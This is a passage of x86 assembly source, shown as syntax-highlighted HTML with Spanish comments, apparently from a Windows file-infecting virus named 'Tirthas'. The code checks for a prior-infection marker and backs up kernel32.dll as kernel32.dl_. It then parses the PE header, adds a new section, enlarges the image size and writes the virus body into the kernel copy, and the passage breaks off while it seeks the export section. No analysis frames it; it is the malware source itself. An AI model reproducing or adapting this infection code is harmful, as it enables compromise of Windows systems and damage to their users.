      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0cdh</span><span class="sc4">,</span><span class="sc2">21h</span><span class="sc4">,</span><span class="sc2">0bah</span><span class="sc4">,</span><span class="sc2">71h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0bfh</span><span class="sc4">,</span><span class="sc2">64h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0b4h</span><span class="sc4">,</span><span class="sc2">56h</span><span class="sc4">,</span><span class="sc2">0cdh</span><span class="sc4">,</span><span class="sc2">21h</span><span class="sc4">,</span><span class="sc2">0b8h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">4ch</span><span class="sc4">,</span><span class="sc2">0cdh</span><span class="sc4">,</span><span class="sc2">21h</span><span class="sc0">

      </span><span class="sc5">New_wininit_end</span><span class="sc0">     </span><span class="sc9">label</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">
      </span><span class="sc1">; COMPRUEBA SE EL KERNEL ESTA INFECTADO</span><span class="sc0">
      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">
      </span><span class="sc1">; Para comprobar si el kernel esta infectado, se llama a la funcion</span><span class="sc0">
      </span><span class="sc1">; SetCurrentDirectoryA con el valor 7BFh en ECX. Si la funcion devuelve</span><span class="sc0">
      </span><span class="sc1">; en ECX el valor 7C7h significa que el kernel esta infectado.</span><span class="sc0">
      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">

 </span><span class="sc5">Test_KERNEL</span><span class="sc4">:</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">7BFh</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">A_SetCurrentDirectoryA</span><span class="sc4">]</span><span class="sc0">

      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">7C7h</span><span class="sc0">
      </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">Generalt_exit</span><span class="sc0">

      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">
      </span><span class="sc1">; Buscar el directorio WINDOWS Y SYSTEM</span><span class="sc0">
      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">

      </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Windows_path</span><span class="sc4">]</span><span class="sc0">

      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0c8h</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">A_GetWindowsDirectory</span><span class="sc4">]</span><span class="sc0">           

      </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">System_path</span><span class="sc4">]</span><span class="sc0">

      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0c8h</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">A_GetSystemDirectoryA</span><span class="sc4">]</span><span class="sc0">           

      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">7BFh</span><span class="sc0">
      </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">System_path</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">;Lo establezemos como</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                    </span><span class="sc1">;directorio actual</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">A_SetCurrentDirectoryA</span><span class="sc4">]</span><span class="sc0">

      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">
      </span><span class="sc1">; VER SI EXISTE KERNEL32.DL_</span><span class="sc0">
      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Flag_fuction_Find_File</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Fuction_Find_first_file</span><span class="sc0">

      </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Generalt_exit</span><span class="sc0">
      </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">
      </span><span class="sc1">; COPIA KERNEL32.DLL A KERNEL32.DL_</span><span class="sc0">
      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">

      </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Kernel32</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">;kernel32.dll</span><span class="sc0">
      </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Kernel32backup</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;kernel32.dl_</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">A_CopyFileA</span><span class="sc4">]</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Flag_fuction_Find_File</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Fuction_Find_first_file</span><span class="sc0">

      </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">New_Wininit</span><span class="sc0">
      </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">Tirthas_size</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FSizeL</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Flag_open_kernel</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Open_file</span><span class="sc0">

 </span><span class="sc5">Header_kernel</span><span class="sc4">:</span><span class="sc0">                            </span><span class="sc1">;Base_file = base de kernel32.dl_</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Base_fichero</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;EAX = PE header</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Address_PEheader</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

      </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">6h</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Number_section</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">

      </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Size_optional_header</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">38h</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Section_alignment</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">File_alignment</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">

      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">
      </span><span class="sc1">; OBTENER LA ULTIMA SECCION DEL KERNEL</span><span class="sc0">
      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">74h</span><span class="sc4">]</span><span class="sc0">                
      </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
      </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                              </span><span class="sc1">;EDI = N directorios * tama쨚</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Number_section</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">
      </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                  </span><span class="sc1">;EAX = N de seccion * tama쨚</span><span class="sc0">

      </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Address_PEheader</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">78h</span><span class="sc0">                            </span><span class="sc1">;EDI = Ultima seccion del kernel</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Address_Last_section</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">

      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">
      </span><span class="sc1">; RELLENAR LA CABECERA DE LA NUEVA SECCION</span><span class="sc0">
      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    
      </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">File_alignment</span><span class="sc4">]</span><span class="sc0">                       
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
      </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
      </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Pointer_to_raw_data</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Address_Last_section</span><span class="sc4">]</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">8h</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">

      </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Section_alignment</span><span class="sc4">]</span><span class="sc0">           
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
      </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
      </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Virtual_address</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

      </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">Tirthas_size</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">1000h</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Section_alignment</span><span class="sc4">]</span><span class="sc0">                 
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
      </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
      </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
     
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Virtual_size</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">File_alignment</span><span class="sc4">]</span><span class="sc0">                 
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
      </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
      </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
      </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Size_of_raw_data</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">
      </span><span class="sc1">; NUEVO SIZE OF IMAGE</span><span class="sc0">
      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Section_alignment</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Address_PEheader</span><span class="sc4">]</span><span class="sc0">

      </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">50h</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
      </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
      </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
  
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Address_PEheader</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">50h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">
      </span><span class="sc1">; INCREMENTAR EL NUMERO DE SECCIONES</span><span class="sc0">
      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">6h</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">6h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">
      </span><span class="sc1">; COPIAR LA CABECERA DE LA NUEVA SECCION</span><span class="sc0">
      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Address_Last_section</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">

      </span><span class="sc6">cld</span><span class="sc0">
      </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Tirthas_section</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">
      </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">
      </span><span class="sc1">; INFECTAR EL KERNEL</span><span class="sc0">
      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Flag_open_kernel</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">

      </span><span class="sc6">cld</span><span class="sc0">
      </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Tirthas_start</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">Tirthas_size</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Pointer_to_raw_data</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Base_fichero</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Flag_open_kernel</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">

      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">
      </span><span class="sc1">; BUSQUEDA DE LA SECCION DE EXPORTACIONES</span><span class="sc0">
      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Address_PEheader</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Size_optional_header</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">18h</span><span class="sc0">

